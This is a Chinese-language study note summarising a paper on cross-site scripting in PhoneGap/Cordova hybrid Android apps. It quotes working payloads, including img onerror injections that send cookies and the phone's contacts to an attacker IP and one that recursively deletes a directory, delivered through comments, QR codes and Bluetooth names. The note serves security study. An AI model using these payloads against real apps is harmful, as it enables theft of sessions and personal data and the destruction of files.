---
title: Cross-site Scripting Attacks on Android Hybrid Applications
tags: [Meeting Paper, NTU]

category: "Survey Papers/Android + Security"
---

# Cross-site Scripting Attacks on Android Hybrid Applications
:::info
Bao, W., Yao, W., Zong, M., & Wang, D. (2017, March). Cross-site scripting attacks on android hybrid applications. In Proceedings of the 2017 International Conference on Cryptography, Security and Privacy (pp. 56-61).
:::

這一篇論文雖然很舊了，但還是蠻有趣的
## Introduction
他在講的是現在市面上的App通常會用一些像是Apache Cordova(早期叫做PhoneGap)這類型的Hybrid框架製作一款App，但是PhoneGap的做法是利用WebView渲染畫面，因此就勢必會出現XSS相關的攻擊，這一篇論文就是在探討如何達成攻擊，以及受害範圍有多廣
* Gartner 的一份報告稱，Hybrid App在基於 HTML5 的 Web  App和本機 App之間提供了平衡，到 2016 年，將在超過 50% 的行動 App中使用
* 為了美化 UI 並在 JavaScript 程式碼中使用行動裝置的原生功能，Hybrid App必須包含第三方元件，而且它們的程式碼可能不可靠。
* 在本文的其餘部分，我們首先對WebView和PhoneGap框架的漏洞進行深入分析。 然後根據我們日常生活中行動應用的使用場景，建立了XSS攻擊混合應用的一般流程。 攻擊結果表明，對Hybrid App的 XSS 攻擊可能會對使用者的行動裝置造成更大的破壞性結果。
## Background
* What is PhoneGap?
    ![圖片](https://hackmd.io/_uploads/rJsdoZWX0.png)
    上圖顯示了PhoneGap App的架構以及如何和device component互動，當Hybrid App的某個功能需要使用 PhoneGap API 時， App可以使用 JavaScript 程式碼呼叫 API，然後 App中的特殊層將 PhoneGap API 呼叫轉換為適合幕後特定功能的device API。
## Proposed Method
* How XSS attack success on PhoneGap's App?
    ![圖片](https://hackmd.io/_uploads/SyPtsW-7R.png)
    有兩種方是可以達成這個攻擊
    * 首先從上圖可以知道，外部的資料有很多種型態，可能是一般文字、QRcode、藍牙等等媒介，而當傳送的資料出現malicious code的時候，PhoneGap Interface的App就會接收這些有問題的資料，並且直接被WebView所render，此時attacker就可以直接根據傳送的payload達到竊取機敏資料的目的
        > 在使用者的幫助下注入程式碼。 當使用者開啟將行動裝置連接到外界的通道時，將提供存取權限以允許來自另一個裝置的攻擊。 惡意程式碼是透過在不知不覺中與另一個裝置互動來注入的，然後按照與第一個裝置類似的流程來實現攻擊。
    * 另外一種則是直接嵌入有問題的code在網頁中，等到使用者瀏覽這個網頁的時候就會被PhoneGap的WebView所Render，達成和上面一樣的效果，類似傳統的攻擊，受害範圍則是cookies, session hijacking, location leaking...，用的function是`document.cookie`, `write()`, `appendChilld()`, `script` tag
## Experiment
作者提到，為了分析一些可能受到XSS攻擊的應用場景，這些 App都是使用PhoneGap框架開發的混合 App。 由於Google Play提供的大部分PhoneGap App要麼沒有使用某些存在漏洞的PhoneGap插件，要麼不顯示攻擊效果，因此很難使用真實的 App進行演示。 因此，他們demo了對他們自己的PhoneGap App的攻擊
### Cookie Stealing and Session Hijacking
作者把malicious code插在簡單的comment management system中，這個App是PhoneGap Framework做的，而且有storage XSS漏洞。如果這個 App是基於native language的，那麼JavaScript code將永遠不會被執行。 但是，在此 PhoneGap  App中，如果 App使用任何易受攻擊的 API 來顯示評論，則程式碼將在 WebView 內執行。
![圖片1](https://hackmd.io/_uploads/SJ6ehb-mR.png)
* 左邊的圖片:
    ```javascript!
    <script>alert(document.cookie)</script>
    ```
    網頁沒有任何異常情況下，作者只使用"append()" API為網頁新增註解。 透過JQuery API顯示評論字段，然後同時觸發注入的程式碼。 顯然，"append()" API 並不安全。 "innerHTML" API 比"append()"更安全，並且不會運行"script"標籤內的程式碼，因此作者可以使用"innerHTML" API 來替換。
* 中間的圖片:
    這就是用替換成innerHTML的結果，會發現這次的攻擊就沒有成功
* 右邊的圖片:
    ```javascript!
    <img src=x onerror= "alert(document.cookie )">
    ```
    但我們還是可以改變payload，讓攻擊可以成功，也就是用上述提到的第二列payload，結果就會如最右邊的截圖
---
當然我們也可以嘗試把得到的敏感資訊透過第三個payload傳出去給attacker，得到的response如下
```javascript!
<img src=x onerror= "new Image().src='http://10.103.30.97:80/cookies/attacker.php?cookie='%2bdocument.cookie">
```
![圖片](https://hackmd.io/_uploads/HJ9W2WZmC.png)
Attacker's Server Receive:
```!
http://10.103.30.97/cookies/manage.php?name=Admin&token=e3afed0047b08059d0fada10f400c1e5
```
### Steal Contact Data
這次攻擊的標的是QRcode，我們可以把惡意的code嵌入在QRcode當中，如果有利用PhoneGap的App掃描到這個QRcode，因為他是在WebView中進行render，所以這個malicious code會被triggered，這個App使用的是`phonegap-plugin-barcodescanner`這個plugin，當程式碼顯示時，`img`的`onerror`事件將會被觸發，然後使用者的聯絡資料將會傳送給攻擊者。
* Attack Pattern
    ```javascript!
    <img src=x onerror=
        "navigator.contacts.find(['displayName','phoneNumbers'],
        function(c){
        r='';
            for(i=0;c[i];i++){
                if(c[i].phoneNumbers&&c[i].phoneNumbers.length){
                    r+=c[i].displayName+c[i].phoneNumbers[0].value+'\n';
            }}
            alert(r);
        new Image().src='http://10.103.30.97/c.php?d='+r; })" >
    ```
如果是用Native Language寫的App就會如左邊的圖片那樣只有顯示這個QRcode儲存的資訊，但如果是用PhoneGap寫的App，經過WebView render出來的結果，就會顯示手機的聯絡人資訊。他是用`navigator.contacts.find`這個API去呼叫PhoneGap的聯絡人plugin的Java code來搜尋使用者的聯絡人
![圖片2](https://hackmd.io/_uploads/B158hZWmR.png)

### Delete Files
這一次換成利用藍牙這個標的達成攻擊，原文提到: 
> 一般來說，如果一個應用程式具有藍牙傳輸功能，它必須能夠讀取和寫入用戶行動裝置上的文件

為了demo攻擊的效果，作者使用`cordova-plugin-bluetooth-serial`插件和`cordova-plugin-file`插件開發了一個PhoneGap應用程式。藍牙裝置的名稱是透過`innerHTML`API顯示的，安全性不夠，攻擊者可以將藍牙裝置的名稱更改為惡意程式碼來實現攻擊。 並且與前兩種設計類似的是再次使用了`onerror`事件。
* Attack Pattern
    ```javascript!
    <img src=x onerror=
        "window.requestFileSystem(LocalFileSystem.PERSISTENT,0
        ,function(f){
            f.root.getDirectory('ID_5',null,
                function (e){
                    e.removeRecursively(
                        function(){
                            alert('Delete ID_5 Success!')
                    },null); },null); },null);">
    ```

同樣的如果用native app進行連線，就不會遇到攻擊的問題(如左圖)，但如果是用右圖的PhoneGap設計的App，`window.requestFileSystem()`要求系統存取根檔案系統並傳回一個對象，該物件儲存在`FileSystem`變數f中。 它的 root 屬性包含一個`DirectoryEntry`對象，表示目前檔案系統的根目錄。 所以我們使用`f.root.getDirectory()`來搜尋根目錄中的`ID_5`目錄。 當找到目錄時，將回傳值儲存在`DirectEntry`物件e中，並呼叫第5行至第9行中的回呼函數。 然後`ID_5`目錄的`DirectEntry`物件呼叫其名為`removeRecurively()`的方法來刪除`ID_5`中的所有檔案。 第8行，右圖顯示指定目錄刪除成功的通知。 
![圖片3](https://hackmd.io/_uploads/rkNt3--mR.png)